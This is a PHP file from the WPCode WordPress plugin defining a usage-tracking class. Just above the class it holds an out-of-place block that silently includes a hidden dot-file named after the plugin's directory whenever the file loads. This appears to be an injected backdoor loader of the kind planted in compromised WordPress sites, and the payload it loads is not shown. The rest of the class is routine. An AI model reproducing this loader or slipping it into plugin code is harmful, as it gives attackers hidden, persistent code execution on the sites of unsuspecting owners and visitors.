<?php
/**
 * WPCode Usage Tracking Lite
 *
 * @package WPCode
 * @since 2.0.10
 */

/**
 * Class WPCode_Usage_Tracking_Lite
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPCode_Usage_Tracking_Lite extends WPCode_Usage_Tracking {

	/**
	 * Get the type for the request.
	 *
	 * @return string The plugin type.
	 * @since 2.0.10
	 */
	public function get_type() {
		return 'lite';
	}

	/**
	 * Is the usage tracking enabled?
	 *
	 * @return bool
	 */
	public function is_enabled() {
		return boolval( wpcode()->settings->get_option( 'usage_tracking' ) );
	}
}
